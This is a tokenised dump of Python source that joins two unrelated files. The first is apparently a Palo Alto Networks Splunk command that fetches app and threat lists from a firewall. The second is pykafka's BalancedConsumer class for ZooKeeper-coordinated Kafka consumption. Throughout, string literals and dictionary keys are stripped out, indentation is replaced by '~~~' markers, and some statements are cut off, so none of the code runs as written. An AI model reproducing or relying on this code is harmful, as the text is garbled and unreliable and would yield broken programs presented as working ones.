# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN \n 
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF \n 
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE. \n 
\n 
# Author: Brian Torres-Gil <btorres-gil@paloaltonetworks.com> \n 
\n 
~~ ~~ """Update app and threat lookup files\n\nAbout this script\n-----------------\nPulls the latest app and threat information from a firewall\nor Panorama and outputs it as search results. This can be leveraged\nto update the app_list.csv and threat_list.csv files\nin the Palo Alto Networks Add-On (TA).\n\nExample usage in Splunk searchbar:\n\nUpdate app list:\n    | pancontentpack 10.5.5.5 apps\n\nUpdate threat list:\n    | pancontentpack 10.5.5.5 threats\n\nWhere 10.5.5.5 is the ip of a firewall or Panorama.\n\n""" \n 
\n 
\n 
######################################################### \n 
# Do NOT modify anything below this line unless you are \n 
# certain of the ramifications of the changes \n 
######################################################### \n 
\n 
import sys # for system params and sys.exit() \n 
import os \n 
import traceback \n 
\n 
libpath = os . path . dirname ( os . path . abspath ( __file__ ) ) \n 
sys . path [ : 0 ] = [ os . path . join ( libpath , ) ] \n 
import common \n 
import environment \n 
import xmltodict \n 
from collections import OrderedDict \n 
\n 
logger = common . logging . getLogger ( ) . getChild ( ) \n 
\n 
try : \n 
~~~ import splunk . Intersplunk # so you can interact with Splunk \n 
import splunk . entity as entity # for splunk config info \n 
~~ except ImportError as e : \n 
~~~ logger . error ( "Unable to import Splunk libraries. Run command with Splunk python:" \n 
"  $SPLUNK_HOME/bin/splunk cmd python %s" % __file__ ) \n 
sys . exit ( 3 ) \n 
\n 
~~ libpath = os . path . dirname ( os . path . abspath ( __file__ ) ) \n 
sys . path [ : 0 ] = [ os . path . join ( libpath , ) ] \n 
sys . path [ : 0 ] = [ os . path . join ( libpath , , , ) ] \n 
sys . path [ : 0 ] = [ os . path . join ( libpath , , ) ] \n 
try : \n 
~~~ import pandevice . base \n 
import pan . xapi \n 
~~ except ImportError : \n 
~~~ print "Unable to import libraries. Please run command from app\'s bin directory where the script is located." exit ( 3 ) \n 
\n 
~~ from common import log \n 
\n 
\n 
def usage ( ) : \n 
~~~ common . exit_with_error ( "Usage: | pancontentpack <firewall/Panorama IP> <apps|threats>" ) \n 
\n 
~~ def parse_apps ( apps_xml ) : \n 
~~~ obj = xmltodict . parse ( apps_xml ) \n 
try : \n 
~~~ apps = obj [ ] [ ] [ ] [ ] \n 
~~ except KeyError as e : \n 
~~~ logger . error ( "Unable to parse app xml from firewall" ) \n 
raise e \n 
~~ csv_apps = [ ] \n 
for app in apps : \n 
~~~ a = OrderedDict ( ) \n 
try : \n 
~~~ a [ ] = app [ ] \n 
a [ ] = app . get ( , "" ) \n 
a [ ] = app . get ( , "" ) \n 
a [ ] = app . get ( , "" ) \n 
a [ ] = app [ ] \n 
a [ ] = app [ ] \n 
a [ ] = app [ ] \n 
a [ ] = app [ ] \n 
a [ ] = app [ ] \n 
a [ ] = app [ ] \n 
a [ ] = app [ ] \n 
if a [ ] != u"yes" and a [ ] != ~~~ a [ ] = a [ ] [ ] \n 
~~ a [ ] = app [ ] \n 
a [ ] = app [ ] \n 
a [ ] = app . get ( , "no" ) \n 
a [ ] = "" \n 
try : \n 
# Sometimes there are more than one default tag \n 
# so make it a list and iterate over the default tags. \n 
~~~ default = app [ ] \n 
if isinstance ( default , list ) : \n 
~~~ for d in default : \n 
~~~ a [ ] = d [ ] [ ] \n 
break \n 
~~ ~~ else : \n 
~~~ a [ ] = default [ ] [ ] \n 
~~ ~~ except KeyError : \n 
~~~ pass \n 
~~ else : \n 
~~~ if not isinstance ( a [ ] , basestring ) : \n 
~~~ a [ ] = "|" . join ( a [ ] ) \n 
~~ ~~ ~~ except Exception as e : \n 
~~~ logger . error ( "Error parsing app: %s" % app [ ] ) \n 
logger . error ( traceback . format_exc ( ) ) \n 
common . exit_with_error ( str ( e ) ) \n 
# convert all out of unicode \n 
~~ for key in a : \n 
~~~ a [ key ] = str ( a [ key ] ) \n 
~~ csv_apps . append ( a ) \n 
~~ logger . info ( "Found %s apps" % len ( csv_apps ) ) \n 
return csv_apps \n 
\n 
\n 
~~ def parse_threats ( threats_xml ) : \n 
~~~ obj = xmltodict . parse ( threats_xml ) \n 
try : \n 
~~~ phone_home = obj [ ] [ ] [ ] [ ] [ ] \n 
vulnerability = obj [ ] [ ] [ ] [ ] [ ] \n 
threats = phone_home + vulnerability \n 
~~ except KeyError as e : \n 
~~~ logger . error ( "Unable to parse threat xml from firewall" ) \n 
raise e \n 
~~ csv_threats = [ ] \n 
for threat in threats : \n 
~~~ a = OrderedDict ( ) \n 
try : \n 
~~~ a [ ] = threat [ ] \n 
a [ ] = threat [ ] \n 
a [ ] = threat [ ] \n 
a [ ] = threat [ ] \n 
a [ ] = threat . get ( , None ) \n 
if a [ ] is not None : \n 
~~~ a [ ] = threat [ ] [ ] \n 
if not isinstance ( a [ ] , basestring ) : \n 
~~~ a [ ] = ", " . join ( a [ ] ) \n 
~~ ~~ else : \n 
~~~ a [ ] = "" \n 
~~ ~~ except KeyError as e : \n 
~~~ logger . error ( "Error parsing app: %s" % threat [ ] ) \n 
raise e \n 
# convert all out of unicode \n 
~~ for key in a : \n 
~~~ a [ key ] = str ( a [ key ] ) \n 
~~ csv_threats . append ( a ) \n 
~~ logger . info ( "Found %s threats" % len ( csv_threats ) ) \n 
return csv_threats \n 
\n 
~~ def main ( ) : \n 
# Get arguments \n 
~~~ args , kwargs = splunk . Intersplunk . getKeywordsAndOptions ( ) \n 
\n 
\n 
# the command on the Splunk searchbar. \n 
\n 
debug = common . check_debug ( kwargs ) \n 
\n 
if len ( args ) < 2 : \n 
~~~ logger . error ( "pancontentpack: Wrong number of arguments: %s, expected 2.\\n" % len ( args ) ) \n 
usage ( ) \n 
\n 
~~ if args [ 1 ] == "apps" : \n 
~~~ logger . info ( "Getting apps from content pack on Palo Alto Networks device at %s..." % args [ 0 ] ~~ elif args [ 1 ] == "threats" : \n 
~~~ logger . info ( "Getting threats from content pack on Palo Alto Networks device at %s..." % args ~~ else : \n 
~~~ usage ( ) \n 
\n 
# Results contains the data from the search results and settings \n 
# contains the sessionKey that we can use to talk to Splunk \n 
# Ignore the results \n 
~~ results , unused1 , settings = splunk . Intersplunk . getOrganizedResults ( ) \n 
# Get the sessionKey \n 
sessionKey = settings [ ] \n 
\n 
log ( debug , "Begin get API key" ) \n 
# Get the API key from the Splunk store or from the device at hostname if no apikey is stored \n 
apikey = common . apikey ( sessionKey , args [ 0 ] , debug ) \n 
\n 
device = pandevice . base . PanDevice ( args [ 0 ] , api_key = apikey ) \n 
\n 
try : \n 
~~~ if args [ 1 ] == "apps" : \n 
~~~ device . xapi . get ( "/config/predefined/application" ) \n 
app_xml = device . xapi . xml_document \n 
csv = parse_apps ( app_xml ) \n 
~~ else : \n 
~~~ device . xapi . get ( "/config/predefined/threats" ) \n 
threat_xml = device . xapi . xml_document \n 
csv = parse_threats ( threat_xml ) \n 
\n 
~~ ~~ except pan . xapi . PanXapiError as e : \n 
~~~ common . exit_with_error ( str ( e ) ) \n 
\n 
\n 
# output results \n 
~~ splunk . Intersplunk . outputResults ( csv ) \n 
\n 
\n 
~~ if __name__ == "__main__" : \n 
~~~ main ( ) \n 
~~ from __future__ import division \n 
"""\nAuthor: Emmett Butler\n""" \n 
__license__ = """\nCopyright 2015 Parse.ly, Inc.\n\nLicensed under the Apache License, Version 2.0 (the "License");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an "AS IS" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n""" \n 
__all__ = [ "BalancedConsumer" ] \n 
import itertools \n 
import logging \n 
import socket \n 
import sys \n 
import time \n 
import traceback \n 
from uuid import uuid4 \n 
import weakref \n 
\n 
from kazoo . client import KazooClient \n 
from kazoo . handlers . gevent import SequentialGeventHandler \n 
from kazoo . exceptions import NoNodeException , NodeExistsError \n 
from kazoo . recipe . watchers import ChildrenWatch \n 
\n 
from . common import OffsetType \n 
from . exceptions import KafkaException , PartitionOwnedError , ConsumerStoppedException \n 
from . handlers import GEventHandler \n 
from . simpleconsumer import SimpleConsumer \n 
from . utils . compat import range , get_bytes , itervalues , iteritems , get_string \n 
try : \n 
~~~ from . import rdkafka \n 
~~ except ImportError : \n 
~~~ rdkafka = False \n 
\n 
\n 
~~ log = logging . getLogger ( __name__ ) \n 
\n 
\n 
def _catch_thread_exception ( fn ) : \n 
~~~ """Sets self._worker_exception when fn raises an exception""" \n 
def wrapped ( self , * args , ** kwargs ) : \n 
~~~ try : \n 
~~~ ret = fn ( self , * args , ** kwargs ) \n 
~~ except Exception : \n 
~~~ self . _worker_exception = sys . exc_info ( ) \n 
~~ else : \n 
~~~ return ret \n 
~~ ~~ return wrapped \n 
\n 
\n 
~~ class BalancedConsumer ( object ) : \n 
~~~ """\n    A self-balancing consumer for Kafka that uses ZooKeeper to communicate\n    with other balancing consumers.\n\n    Maintains a single instance of SimpleConsumer, periodically using the\n    consumer rebalancing algorithm to reassign partitions to this\n    SimpleConsumer.\n    """ \n 
def __init__ ( self , \n 
topic , \n 
cluster , \n 
consumer_group , \n 
fetch_message_max_bytes = 1024 * 1024 , \n 
num_consumer_fetchers = 1 , \n 
auto_commit_enable = False , \n 
auto_commit_interval_ms = 60 * 1000 , \n 
queued_max_messages = 2000 , \n 
fetch_min_bytes = 1 , \n 
fetch_wait_max_ms = 100 , \n 
offsets_channel_backoff_ms = 1000 , \n 
offsets_commit_max_retries = 5 , \n 
auto_offset_reset = OffsetType . EARLIEST , \n 
consumer_timeout_ms = - 1 , \n 
rebalance_max_retries = 5 , \n 
rebalance_backoff_ms = 2 * 1000 , \n 
zookeeper_connection_timeout_ms = 6 * 1000 , \n 
zookeeper_connect = , \n 
zookeeper = None , \n 
auto_start = True , \n 
reset_offset_on_start = False , \n 
post_rebalance_callback = None , \n 
use_rdkafka = False , \n 
compacted_topic = False ) : \n 
~~~ """Create a BalancedConsumer instance\n\n        :param topic: The topic this consumer should consume\n        :type topic: :class:`pykafka.topic.Topic`\n        :param cluster: The cluster to which this consumer should connect\n        :type cluster: :class:`pykafka.cluster.Cluster`\n        :param consumer_group: The name of the consumer group this consumer\n            should join.\n        :type consumer_group: bytes\n        :param fetch_message_max_bytes: The number of bytes of messages to\n            attempt to fetch with each fetch request\n        :type fetch_message_max_bytes: int\n        :param num_consumer_fetchers: The number of workers used to make\n            FetchRequests\n        :type num_consumer_fetchers: int\n        :param auto_commit_enable: If true, periodically commit to kafka the\n            offset of messages already fetched by this consumer. This also\n            requires that `consumer_group` is not `None`.\n        :type auto_commit_enable: bool\n        :param auto_commit_interval_ms: The frequency (in milliseconds) at which\n            the consumer\'s offsets are committed to kafka. This setting is\n            ignored if `auto_commit_enable` is `False`.\n        :type auto_commit_interval_ms: int\n        :param queued_max_messages: The maximum number of messages buffered for\n            consumption in the internal\n            :class:`pykafka.simpleconsumer.SimpleConsumer`\n        :type queued_max_messages: int\n        :param fetch_min_bytes: The minimum amount of data (in bytes) that the\n            server should return for a fetch request. If insufficient data is\n            available, the request will block until sufficient data is available.\n        :type fetch_min_bytes: int\n        :param fetch_wait_max_ms: The maximum amount of time (in milliseconds)\n            that the server will block before answering a fetch request if\n            there isn\'t sufficient data to immediately satisfy `fetch_min_bytes`.\n        :type fetch_wait_max_ms: int\n        :param offsets_channel_backoff_ms: Backoff time to retry failed offset\n            commits and fetches.\n        :type offsets_channel_backoff_ms: int\n        :param offsets_commit_max_retries: The number of times the offset commit\n            worker should retry before raising an error.\n        :type offsets_commit_max_retries: int\n        :param auto_offset_reset: What to do if an offset is out of range. This\n            setting indicates how to reset the consumer\'s internal offset\n            counter when an `OffsetOutOfRangeError` is encountered.\n        :type auto_offset_reset: :class:`pykafka.common.OffsetType`\n        :param consumer_timeout_ms: Amount of time (in milliseconds) the\n            consumer may spend without messages available for consumption\n            before returning None.\n        :type consumer_timeout_ms: int\n        :param rebalance_max_retries: The number of times the rebalance should\n            retry before raising an error.\n        :type rebalance_max_retries: int\n        :param rebalance_backoff_ms: Backoff time (in milliseconds) between\n            retries during rebalance.\n        :type rebalance_backoff_ms: int\n        :param zookeeper_connection_timeout_ms: The maximum time (in\n            milliseconds) that the consumer waits while establishing a\n            connection to zookeeper.\n        :type zookeeper_connection_timeout_ms: int\n        :param zookeeper_connect: Comma-separated (ip1:port1,ip2:port2) strings\n            indicating the zookeeper nodes to which to connect.\n        :type zookeeper_connect: str\n        :param zookeeper: A KazooClient connected to a Zookeeper instance.\n            If provided, `zookeeper_connect` is ignored.\n        :type zookeeper: :class:`kazoo.client.KazooClient`\n        :param auto_start: Whether the consumer should begin communicating\n            with zookeeper after __init__ is complete. If false, communication\n            can be started with `start()`.\n        :type auto_start: bool\n        :param reset_offset_on_start: Whether the consumer should reset its\n            internal offset counter to `self._auto_offset_reset` and commit that\n            offset immediately upon starting up\n        :type reset_offset_on_start: bool\n        :param post_rebalance_callback: A function to be called when a rebalance is\n            in progress. This function should accept three arguments: the\n            :class:`pykafka.balancedconsumer.BalancedConsumer` instance that just\n            completed its rebalance, a dict of partitions that it owned before the\n            rebalance, and a dict of partitions it owns after the rebalance. These dicts\n            map partition ids to the most recently known offsets for those partitions.\n            This function can optionally return a dictionary mapping partition ids to\n            offsets. If it does, the consumer will reset its offsets to the supplied\n            values before continuing consumption.\n            Note that the BalancedConsumer is in a poorly defined state at\n            the time this callback runs, so that accessing its properties\n            (such as `held_offsets` or `partitions`) might yield confusing\n            results.  Instead, the callback should really rely on the\n            provided partition-id dicts, which are well-defined.\n        :type post_rebalance_callback: function\n        :param use_rdkafka: Use librdkafka-backed consumer if available\n        :type use_rdkafka: bool\n        :param compacted_topic: Set to read from a compacted topic. Forces\n            consumer to use less stringent message ordering logic because compacted\n            topics do not provide offsets in stict incrementing order.\n        :type compacted_topic: bool\n        """ \n 
self . _cluster = cluster \n 
if not isinstance ( consumer_group , bytes ) : \n 
~~~ raise TypeError ( "consumer_group must be a bytes object" ) \n 
~~ self . _consumer_group = consumer_group \n 
self . _topic = topic \n 
\n 
self . _auto_commit_enable = auto_commit_enable \n 
self . _auto_commit_interval_ms = auto_commit_interval_ms \n 
self . _fetch_message_max_bytes = fetch_message_max_bytes \n 
self . _fetch_min_bytes = fetch_min_bytes \n 
self . _rebalance_max_retries = rebalance_max_retries \n 
self . _num_consumer_fetchers = num_consumer_fetchers \n 
self . _queued_max_messages = queued_max_messages \n 
self . _fetch_wait_max_ms = fetch_wait_max_ms \n 
self . _rebalance_backoff_ms = rebalance_backoff_ms \n 
self . _consumer_timeout_ms = consumer_timeout_ms \n 
self . _offsets_channel_backoff_ms = offsets_channel_backoff_ms \n 
self . _offsets_commit_max_retries = offsets_commit_max_retries \n 
self . _auto_offset_reset = auto_offset_reset \n 
self . _zookeeper_connect = zookeeper_connect \n 
self . _zookeeper_connection_timeout_ms = zookeeper_connection_timeout_ms \n 
self . _reset_offset_on_start = reset_offset_on_start \n 
self . _post_rebalance_callback = post_rebalance_callback \n 
self . _generation_id = - 1 \n 
self . _running = False \n 
self . _worker_exception = None \n 
self . _worker_trace_logged = False \n 
self . _is_compacted_topic = compacted_topic \n 
\n 
if not rdkafka and use_rdkafka : \n 
~~~ raise ImportError ( "use_rdkafka requires rdkafka to be installed" ) \n 
~~ if isinstance ( self . _cluster . handler , GEventHandler ) and use_rdkafka : \n 
~~~ raise ImportError ( "use_rdkafka cannot be used with gevent" ) \n 
~~ self . _use_rdkafka = rdkafka and use_rdkafka \n 
\n 
self . _rebalancing_lock = cluster . handler . Lock ( ) \n 
self . _consumer = None \n 
self . _consumer_id = get_bytes ( "{hostname}:{uuid}" . format ( \n 
hostname = socket . gethostname ( ) , \n 
uuid = uuid4 ( ) \n 
) ) \n 
self . _setting_watches = True \n 
\n 
self . _topic_path = . format ( \n 
group = self . _consumer_group , \n 
topic = self . _topic . name ) \n 
self . _consumer_id_path = . format ( \n 
group = self . _consumer_group ) \n 
\n 
self . _zookeeper = None \n 
self . _owns_zookeeper = zookeeper is None \n 
if zookeeper is not None : \n 
~~~ self . _zookeeper = zookeeper \n 
~~ if auto_start is True : \n 
~~~ self . start ( ) \n 
\n 
~~ ~~ def __del__ ( self ) : \n 
~~~ log . debug ( "Finalising {}" . format ( self ) ) \n 
if self . _running : \n 
~~~ self . stop ( ) \n 
\n 
~~ ~~ def __repr__ ( self ) : \n 
~~~ return "<{module}.{name} at {id_} (consumer_group={group})>" . format ( \n 
module = self . __class__ . __module__ , \n 
name = self . __class__ . __name__ , \n 
id_ = hex ( id ( self ) ) , \n 
group = self . _consumer_group \n 
) \n 
\n 
~~ def _raise_worker_exceptions ( self ) : \n 
~~~ """Raises exceptions encountered on worker threads""" \n 
if self . _worker_exception is not None : \n 
~~~ _ , ex , tb = self . _worker_exception \n 
if not self . _worker_trace_logged : \n 
~~~ self . _worker_trace_logged = True \n 
log . error ( "Exception encountered in worker thread:\\n%s" , \n 
"" . join ( traceback . format_tb ( tb ) ) ) \n 
~~ raise ex \n 
\n 
~~ ~~ @ property \n 
def topic ( self ) : \n 
~~~ """The topic this consumer consumes""" \n 
return self . _topic \n 
\n 
~~ @ property \n 
def partitions ( self ) : \n 
~~~ """A list of the partitions that this consumer consumes""" \n 
return self . _consumer . partitions if self . _consumer else dict ( ) \n 
\n 
~~ @ property \n 
def _partitions ( self ) : \n 
~~~ """Convenient shorthand for set of partitions internally held""" \n 
return set ( \n 
[ ] if self . partitions is None else itervalues ( self . partitions ) ) \n 
\n 
~~ @ property \n 
def held_offsets ( self ) : \n 
~~~ """Return a map from partition id to held offset for each partition""" \n 
if not self . _consumer : \n 
~~~ return None \n 
~~ return self . _consumer . held_offsets \n 
\n 
~~ def start ( self ) : \n 
~~~ """Open connections and join a consumer group.""" \n 
try : \n 
~~~ if self . _zookeeper is None : \n 
~~~ self . _setup_zookeeper ( self . _zookeeper_connect , \n 
self . _zookeeper_connection_timeout_ms ) \n 
~~ self . _zookeeper . ensure_path ( self . _topic_path ) \n 
self . _add_self ( ) \n 
self . _running = True \n 
self . _set_watches ( ) \n 
self . _rebalance ( ) \n 
~~ except Exception : \n 
~~~ log . exception ( "Stopping consumer in response to error" ) \n 
self . stop ( ) \n 
\n 
~~ ~~ def stop ( self ) : \n 
~~~ """Close the zookeeper connection and stop consuming.\n\n        This method should be called as part of a graceful shutdown process.\n        """ \n 
log . debug ( "Stopping {}" . format ( self ) ) \n 
with self . _rebalancing_lock : \n 
# We acquire the lock in order to prevent a race condition where a \n 
# rebalance that is already underway might re-register the zk \n 
# nodes that we remove here \n 
~~~ self . _running = False \n 
~~ if self . _consumer is not None : \n 
~~~ self . _consumer . stop ( ) \n 
~~ if self . _owns_zookeeper : \n 
# NB this should always come last, so we do not hand over control \n 
# of our partitions until consumption has really been halted \n 
~~~ self . _zookeeper . stop ( ) \n 
~~ else : \n 
~~~ self . _remove_partitions ( self . _get_held_partitions ( ) ) \n 
try : \n 
~~~ self . _zookeeper . delete ( self . _path_self ) \n 
~~ except NoNodeException : \n 
~~~ pass \n 
\n 
# facilities for that in ChildrenWatch - as a workaround we check \n 
# self._running in the watcher callbacks (see further down) \n 
\n 
~~ ~~ ~~ def _setup_zookeeper ( self , zookeeper_connect , timeout ) : \n 
~~~ """Open a connection to a ZooKeeper host.\n\n        :param zookeeper_connect: The \'ip:port\' address of the zookeeper node to\n            which to connect.\n        :type zookeeper_connect: str\n        :param timeout: Connection timeout (in milliseconds)\n        :type timeout: int\n        """ \n 
kazoo_kwargs = { : timeout / 1000 } \n 
if isinstance ( self . _cluster . handler , GEventHandler ) : \n 
~~~ kazoo_kwargs [ ] = SequentialGeventHandler ( ) \n 
~~ self . _zookeeper = KazooClient ( zookeeper_connect , ** kazoo_kwargs ) \n 
self . _zookeeper . start ( ) \n 
\n 
~~ def _setup_internal_consumer ( self , partitions = None , start = True ) : \n 
~~~ """Instantiate an internal SimpleConsumer instance""" \n 
if partitions is None : \n 
~~~ partitions = [ ] \n 
# Only re-create internal consumer if something changed. \n 
~~ if partitions != self . _partitions : \n 
~~~ cns = self . _get_internal_consumer ( partitions = list ( partitions ) , start = start ) \n 
if self . _post_rebalance_callback is not None : \n 
~~~ old_offsets = ( self . _consumer . held_offsets \n 
if self . _consumer else dict ( ) ) \n 
new_offsets = cns . held_offsets \n 
try : \n 
~~~ reset_offsets = self . _post_rebalance_callback ( \n 
self , old_offsets , new_offsets ) \n 
~~ except Exception : \n 
~~~ log . exception ( "post rebalance callback threw an exception" ) \n 
self . _worker_exception = sys . exc_info ( ) \n 
return False \n 
\n 
~~ if reset_offsets : \n 
~~~ cns . reset_offsets ( partition_offsets = [ \n 
( cns . partitions [ id_ ] , offset ) for \n 
( id_ , offset ) in iteritems ( reset_offsets ) ] ) \n 
~~ ~~ self . _consumer = cns \n 
~~ return True \n 
\n 
~~ def _get_internal_consumer ( self , partitions = None , start = True ) : \n 
~~~ """Instantiate a SimpleConsumer for internal use.\n\n        If there is already a SimpleConsumer instance held by this object,\n        disable its workers and mark it for garbage collection before\n        creating a new one.\n        """ \n 
if partitions is None : \n 
~~~ partitions = [ ] \n 
~~ reset_offset_on_start = self . _reset_offset_on_start \n 
if self . _consumer is not None : \n 
~~~ self . _consumer . stop ( ) \n 
# only use this setting for the first call to \n 
# _get_internal_consumer. subsequent calls should not \n 
# reset the offsets, since they can happen at any time \n 
reset_offset_on_start = False \n 
~~ Cls = ( rdkafka . RdKafkaSimpleConsumer \n 
if self . _use_rdkafka else SimpleConsumer ) \n 
return Cls ( \n 
self . _topic , \n 
self . _cluster , \n 
consumer_group = self . _consumer_group , \n 
partitions = partitions , \n 
auto_commit_enable = self . _auto_commit_enable , \n 
auto_commit_interval_ms = self . _auto_commit_interval_ms , \n 
fetch_message_max_bytes = self . _fetch_message_max_bytes , \n 
fetch_min_bytes = self . _fetch_min_bytes , \n 
num_consumer_fetchers = self . _num_consumer_fetchers , \n 
queued_max_messages = self . _queued_max_messages , \n 
fetch_wait_max_ms = self . _fetch_wait_max_ms , \n 
consumer_timeout_ms = self . _consumer_timeout_ms , \n 
offsets_channel_backoff_ms = self . _offsets_channel_backoff_ms , \n 
offsets_commit_max_retries = self . _offsets_commit_max_retries , \n 
auto_offset_reset = self . _auto_offset_reset , \n 
reset_offset_on_start = reset_offset_on_start , \n 
auto_start = start , \n 
compacted_topic = self . _is_compacted_topic , \n 
generation_id = self . _generation_id , \n 
consumer_id = self . _consumer_id \n 
) \n 
\n 
~~ def _decide_partitions ( self , participants , consumer_id = None ) : \n 
~~~ """Decide which partitions belong to this consumer.\n\n        Uses the consumer rebalancing algorithm described here\n        http://kafka.apache.org/documentation.html\n\n        It is very important that the participants array is sorted,\n        since this algorithm runs on each consumer and indexes into the same\n        array. The same array index operation must return the same\n        result on each consumer.\n\n        :param participants: Sorted list of ids of all other consumers in this\n            consumer group.\n        :type participants: Iterable of `bytes`\n        :param consumer_id: The ID of the consumer for which to generate a partition\n            assignment. Defaults to `self._consumer_id`\n        """ \n 
# Freeze and sort partitions so we always have the same results \n 
p_to_str = lambda p : . join ( [ str ( p . topic . name ) , str ( p . leader . id ) , str ( p . id ) ] ) \n 
all_parts = self . _topic . partitions . values ( ) \n 
all_parts = sorted ( all_parts , key = p_to_str ) \n 
\n 
# get start point, # of partitions, and remainder \n 
participants = sorted ( participants ) \n 
idx = participants . index ( consumer_id or self . _consumer_id ) \n 
parts_per_consumer = len ( all_parts ) // len ( participants ) \n 
remainder_ppc = len ( all_parts ) % len ( participants ) \n 
\n 
start = parts_per_consumer * idx + min ( idx , remainder_ppc ) \n 
num_parts = parts_per_consumer + ( 0 if ( idx + 1 > remainder_ppc ) else 1 ) \n 
\n 
# assign partitions from i*N to (i+1)*N - 1 to consumer Ci \n 
new_partitions = itertools . islice ( all_parts , start , start + num_parts ) \n 
new_partitions = set ( new_partitions ) \n 
log . info ( , \n 
self . _consumer_id , len ( participants ) , len ( all_parts ) , \n 
len ( new_partitions ) ) \n 
log . debug ( , [ p_to_str ( p ) for p in new_partitions ] ) \n 
return new_partitions \n 
\n 
~~ def _get_participants ( self ) : \n 
~~~ """Use zookeeper to get the other consumers of this topic.\n\n        :return: A sorted list of the ids of other consumers of this\n            consumer\'s topic\n        """ \n 
try : \n 
~~~ consumer_ids = self . _zookeeper . get_children ( self . _consumer_id_path ) \n 
~~ except NoNodeException : \n 
~~~ log . debug ( "Consumer group doesn\'t exist. " \n 
"No participants to find" ) \n 
return [ ] \n 
\n 
~~ participants = [ ] \n 
for id_ in consumer_ids : \n 
~~~ try : \n 
~~~ topic , stat = self . _zookeeper . get ( "%s/%s" % ( self . _consumer_id_path , id_ ) ) \n 
if topic == self . _topic . name : \n 
~~~ participants . append ( get_bytes ( id_ ) ) \n 
~~ ~~ except NoNodeException : \n 
~~~ pass # node disappeared between ``get_children`` and ``get`` \n 
~~ ~~ participants = sorted ( participants ) \n 
return participants \n 
\n 
~~ def _build_watch_callback ( self , fn , proxy ) : \n 
~~~ """Return a function that\'s safe to use as a ChildrenWatch callback\n\n        Fixes the issue from https://github.com/Parsely/pykafka/issues/345\n        """ \n 
def _callback ( children ) : \n 
# discover whether the referenced object still exists \n 
~~~ try : \n 
~~~ proxy . __repr__ ( ) \n 
~~ except ReferenceError : \n 
~~~ return False \n 
~~ return fn ( proxy , children ) \n 
~~ return _callback \n 
\n 
~~ def _set_watches ( self ) : \n 
~~~ """Set watches in zookeeper that will trigger rebalances.\n\n        Rebalances should be triggered whenever a broker, topic, or consumer\n        znode is changed in zookeeper. This ensures that the balance of the\n        consumer group remains up-to-date with the current state of the\n        cluster.\n        """ \n 
proxy = weakref . proxy ( self ) \n 
_brokers_changed = self . _build_watch_callback ( BalancedConsumer . _brokers_changed , proxy ) \n 
_topics_changed = self . _build_watch_callback ( BalancedConsumer . _topics_changed , proxy ) \n 
_consumers_changed = self . _build_watch_callback ( BalancedConsumer . _consumers_changed , proxy ) \n 
\n 
self . _setting_watches = True \n 
# Set all our watches and then rebalance \n 
broker_path = \n 
try : \n 
~~~ self . _broker_watcher = ChildrenWatch ( \n 
self . _zookeeper , broker_path , \n 
_brokers_changed \n 
) \n 
~~ except NoNodeException : \n 
~~~ raise Exception ( \n 
\'The broker_path "%s" does not exist in your \' \n 
\n 
% broker_path ) \n 
\n 
~~ self . _topics_watcher = ChildrenWatch ( \n 
self . _zookeeper , \n 
, \n 
_topics_changed \n 
) \n 
\n 
self . _consumer_watcher = ChildrenWatch ( \n 
self . _zookeeper , self . _consumer_id_path , \n 
_consumers_changed \n 
) \n 
self . _setting_watches = False \n 
\n 
~~ def _add_self ( self ) : \n 
~~~ """Register this consumer in zookeeper.\n\n        This method ensures that the number of participants is at most the\n        number of partitions.\n        """ \n 
participants = self . _get_participants ( ) \n 
if len ( self . _topic . partitions ) <= len ( participants ) : \n 
~~~ raise KafkaException ( "Cannot add consumer: more consumers than partitions" ) \n 
\n 
~~ self . _zookeeper . create ( \n 
self . _path_self , self . _topic . name , ephemeral = True , makepath = True ) \n 
\n 
~~ @ property \n 
def _path_self ( self ) : \n 
~~~ """Path where this consumer should be registered in zookeeper""" \n 
return . format ( \n 
path = self . _consumer_id_path , \n 
# get_string is necessary to avoid writing literal "b\'" to zookeeper \n 
id_ = get_string ( self . _consumer_id ) \n 
) \n 
\n 
~~ def _update_member_assignment ( self ) : \n 
~~~ """Decide and assign new partitions for this consumer""" \n 
for i in range ( self . _rebalance_max_retries ) : \n 
~~~ try : \n 
# If retrying, be sure to make sure the \n 
# partition allocation is correct. \n 
~~~ participants = self . _get_participants ( ) \n 
if self . _consumer_id not in participants : \n 
# situation that only occurs if our zk session expired \n 
~~~ self . _add_self ( ) \n 
participants . append ( self . _consumer_id ) \n 
\n 
~~ new_partitions = self . _decide_partitions ( participants ) \n 
if not new_partitions : \n 
~~~ log . warning ( "No partitions assigned to consumer %s" , \n 
self . _consumer_id ) \n 
\n 
# Update zk with any changes: \n 
# Note that we explicitly fetch our set of held partitions \n 
# from zk, rather than assuming it will be identical to \n 
# `self.partitions`.  This covers the (rare) situation \n 
# where due to an interrupted connection our zk session \n 
\n 
# zk, but `self._partitions` may be outdated and non-empty \n 
~~ current_zk_parts = self . _get_held_partitions ( ) \n 
self . _remove_partitions ( current_zk_parts - new_partitions ) \n 
self . _add_partitions ( new_partitions - current_zk_parts ) \n 
if self . _setup_internal_consumer ( new_partitions ) : \n 
~~~ log . info ( ) \n 
~~ break \n 
~~ except PartitionOwnedError as ex : \n 
~~~ if i == self . _rebalance_max_retries - 1 : \n 
~~~ log . warning ( , \n 
ex . partition , i ) \n 
raise \n 
~~ log . info ( , ex . partition ) \n 
self . _cluster . handler . sleep ( i * ( self . _rebalance_backoff_ms / 1000 ) ) \n 
\n 
~~ ~~ ~~ def _rebalance ( self ) : \n 
~~~ """Start the rebalancing process for this consumer\n\n        This method is called whenever a zookeeper watch is triggered.\n        """ \n 
if self . _consumer is not None : \n 
~~~ self . commit_offsets ( ) \n 
\n 
\n 
~~ with self . _rebalancing_lock : \n 
~~~ if not self . _running : \n 
~~~ raise ConsumerStoppedException \n 
~~ log . info ( \'Rebalancing consumer "%s" for topic "%s".\' % ( \n 
self . _consumer_id , self . _topic . name ) ) \n 
self . _update_member_assignment ( ) \n 
\n 
~~ ~~ def _path_from_partition ( self , p ) : \n 
~~~ """Given a partition, return its path in zookeeper.\n\n        :type p: :class:`pykafka.partition.Partition`\n        """ \n 
